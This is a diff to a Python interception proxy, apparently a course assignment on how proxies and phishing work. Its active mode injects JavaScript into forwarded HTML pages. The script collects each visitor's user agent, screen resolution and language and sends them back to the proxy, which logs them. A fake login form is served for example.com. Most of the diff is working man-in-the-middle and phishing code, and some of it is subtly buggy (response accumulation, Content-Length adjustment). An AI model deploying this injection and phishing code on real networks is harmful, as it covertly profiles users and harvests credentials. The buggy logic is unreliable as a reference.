@@ -37,6 +37,11 @@ def main():
 
     args = parser.parse_args()
     print("Arguments: {}".format(args))
+
+    if DEBUG:
+        args.listening_ip = "127.0.0.1"
+        args.listening_port = "8080"
+        args.mode = "active"
     
     if args.listening_ip is None:
         print("No listening IP provided. Exiting...")
@@ -54,11 +59,11 @@ def main():
         print("Invalid mode provided. Exiting...")
         exit(1)
 
-def proxy_active(listening_ip, listening_port):
-    print("Active mode selected.")
-    print("Listening on {}:{}".format(listening_ip, listening_port))
-
-
+################################################################################################################
+################################################################################################################
+###################################### PASSIVE MODE ############################################################
+################################################################################################################
+################################################################################################################
 '''
 In this mode your proxy, in addition to forwarding packets, should continuously look for the
 presence of the following information in packets and log them to to a file named info 1.txt. Note that your code
@@ -84,10 +89,10 @@ def proxy_passive(listening_ip, listening_port):
     # For each incoming connection, create a new thread and handle the request
     while True:
         client_socket, _ = proxy_socket.accept()
-        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
+        client_handler = threading.Thread(target=handle_passive_client, args=(client_socket,))
         client_handler.start()
 
-def handle_client(client_socket):
+def handle_passive_client(client_socket):
     with client_socket:
         request = client_socket.recv(4096)
         request_data = request.decode('utf-8')
@@ -99,6 +104,12 @@ def handle_client(client_socket):
             return
 
         print("Handling HTTP request to host: {}, port: {}".format(host, port))
+
+        # Check if request is for the predefined domain for phishing
+        if host == "example.com":
+            # Send a phishing page (malicious JavaScript)
+            client_socket.sendall(generate_phishing_page().encode('utf-8'))
+            return
 
         # Process request data
         parse_http_packet(request_data, 'request')
@@ -200,7 +211,6 @@ def extract_names(data):
             names.append(word)
     return names
 
-
 def log_info(info, data_type):
     with open("info1.txt", "a") as f:
         f.write(f"--- {data_type.upper()} DATA ---\n")
@@ -209,6 +219,210 @@ def log_info(info, data_type):
                 f.write(f"{key}: {value}\n")
         f.write("\n")
 
+################################################################################################################
+################################################################################################################
+###################################### ACTIVE MODE #############################################################
+################################################################################################################
+################################################################################################################
+
+'''
+Active Mode: In this mode your proxy will actively inject javascript in the response pages. Your injected javascript
+code should extract the client’s user agent, screen resolution, and language and should send this information back
+to the proxy server IP address as a GET request with the details encoded as the query parameters, stated in the
+example below. On receiving the request, your proxy should parse it, and save the relevant information into a file
+named info 2.txt. Include all the information in a clear, easy-to-read format.
+
+http://proxy ip address/?user-agent=USER AGENT&screen=SCREEN RES&lang=LANGUAGE
+
+Hint: To get the user-agent and language, look into the JS navigator module. The screen resolution can be ex-
+tracted from the JS window module. To send strings as a query parameter, make sure you encode them accordingly.
+
+Phishing Attack:. Additionally, your system should deploy a phishing attack when the user tries to connect to a
+predefined domain (e.g., example.com). Your proxy should return a bogus page with a login form in those cases.
+Feel free to design the phishing page however you like, keeping it simple and realistic in appearance. However,
+your goal is NOT to create a real phishing page (do not use actual copyrighted logos, do not include JavaScript
+functionality, etc.). The main puprose of this task is to understand the proxy functionalities, capabilities and how
+phishing attacks work.
+
+'''
+
+def proxy_active(listening_ip, listening_port):
+    print("Active mode selected.")
+    print("Listening on {}:{}".format(listening_ip, listening_port))
+
+    proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #proxy_socket.bind((listening_ip, int(listening_port)))
+    proxy_socket.bind(("0.0.0.0", int(listening_port)))
+    proxy_socket.listen(5)
+    
+    while True:
+        client_socket, _ = proxy_socket.accept()
+        client_handler = threading.Thread(target=handle_active_client, args=(client_socket, listening_ip, listening_port))
+        client_handler.start()
+
+
+def handle_active_client(client_socket, proxy_ip, proxy_port):
+    with client_socket:
+        request = client_socket.recv(4096)
+        request_data = request.decode('utf-8')
+        host, port = get_destination_host_port(request_data)
+
+        if port == 443:
+            print("Skipping HTTPS request to host: {}, port: {}".format(host, port))
+            return
+
+        print("Handling HTTP request to host: {}, port: {}".format(host, port))
+
+        # Handle the GET request with client data
+        if '/?user-agent=' in request_data:
+            parse_and_log_client_data(request_data)
+            # Send a simple HTTP response (acknowledgment)
+            client_socket.sendall("HTTP/1.1 200 OK\r\n\r\n".encode('utf-8'))
+            return
+
+        # Forwarding the request to the destination server
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server_socket.connect((host, port))
+        server_socket.sendall(request)
+        
+
+        response = b''
+        while True:
+            data = server_socket.recv(4096)
+            if not data:
+                break
+        response += data
+        
+        try:
+            print("Handling HTTP response from host: {}, port: {}".format(host, port))
+            response_data = response.decode('utf-8')
+            if DEBUG:
+                print("Response is:\n " + response_data)
+            # Inject JavaScript if content is HTML
+            if 'text/html' in response_data:
+                response_data = inject_javascript(response_data, proxy_ip, proxy_port)
+        except Exception as e:
+            print("Error decoding response: {}".format(e))
+            # Forward the original response in case of decode error
+            client_socket.sendall(response)
+            return
+        
+        client_socket.sendall(response_data.encode('utf-8'))
+
+def modify_content_length_header(response_data, len_js_code):
+    if DEBUG:
+        print("Modifying CSP header...")
+   # Split the response into headers and body
+
+    header_lines, body = response_data.split("\r\n\r\n", 1)
+
+    # Split the headers into lines
+    headers = header_lines.split("\n")
+
+    # Substitute Content-length
+    for i, line in enumerate(headers):
+        if line.startswith("Content-Length:"):
+            num = int(line.split(":")[1].strip())
+            num += len_js_code
+            headers[i] = "Content-Length: {}".format(num)
+            break
+    
+    # Compose packet
+    headers = "\n".join(headers)
+    modified_response = headers + "\n\n" + body
+
+    # Remove the Content-Security-Policy header
+    #headers = "\n".join([h for h in headers if not h.startswith("Content-Security-Policy")])
+
+    if DEBUG:
+        print("Modified packet:\n{}".format(modified_response))
+
+    return modified_response
+
+    '''
+    # Reassemble the modified response
+    modified_response = "\n".join(headers) + "\n\n" + body
+
+    if DEBUG:
+        print("Modified response:\n{}".format(modified_response))
+    '''
+
+def parse_and_log_client_data(request_data):
+    """
+    Parses the GET request with client data and logs it to info2.txt.
+    """
+    if DEBUG:
+        print("Parsing and logging client data...")
+    user_agent = re.search(r'user-agent=([^&]+)', request_data)
+    screen_res = re.search(r'screen=([^&]+)', request_data)
+    language = re.search(r'lang=([^&\s]+)', request_data)
+
+    with open("info2.txt", "a") as f:
+        if user_agent:
+            f.write("User-Agent: {}\n".format(unquote(user_agent.group(1))))
+        if screen_res:
+            f.write("Screen Resolution: {}\n".format(unquote(screen_res.group(1))))
+        if language:
+            f.write("Language: {}\n".format(unquote(language.group(1))))
+        f.write("\n")
+
+def generate_phishing_page():
+    if DEBUG:
+        print("Generating phishing page...")
+    html_content = """
+    <html>
+    <head><title>Example</title></head>
+    <body>
+    <h1>Login Page</h1>
+    <p>This is a secure logic. Please, enter details below.</p>
+    <form action="http://example.com/login" method="post">
+        <label for="username"> Username: </label><br>
+        <input type="text" id="username" name="username"><br>
+        <label for="password"> Password: </label><br>
+        <input type="password" id="password" name="password"><br>
+        <input type="submit" value="Login">
+    </form>
+    </body>
+    </html>
+    """
+    return html_content
+
+def inject_javascript(response_data, proxy_ip, proxy_port):
+    if DEBUG:
+        print("Injecting JavaScript...")
+        print("Response is:\n{}".format(response_data))
+    js_code = """
+        <script>
+            var user_agent = window.navigator.userAgent;
+            var screen_res = window.screen.width.toString() + 'x' + window.screen.height.toString();
+            var language = window.navigator.language;
+            var url = 'http://' + '{proxy_ip}' + ':' + {proxy_port} + '/?user-agent=' + user_agent + '&screen=' + screen_res + '&lang=' + language;
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("GET", url, true);
+            xhttp.send();
+        </script>
+    """
+    response_data = modify_content_length_header(response_data, len(js_code))
+    js_code = js_code.replace("{proxy_ip}", proxy_ip)
+    js_code = js_code.replace("{proxy_port}", str(proxy_port))
+
+    # Find the position of the </body> tag
+    body_end_index = response_data.lower().find("</body>")
+    
+    # If </body> tag is found
+    if body_end_index != -1:
+        # Split the response data
+        part1 = response_data[:body_end_index]
+        part2 = response_data[body_end_index:]
+        # Reassemble with the JavaScript injected
+        malicious_html = part1 + js_code + part2
+    else:
+        # If </body> tag is not found, append the JavaScript at the end
+        malicious_html = response_data + js_code
+
+    if DEBUG:
+        print("Malicious HTML content:\n{}".format(malicious_html))
+    return malicious_html
 
 if __name__ == "__main__":
     main()
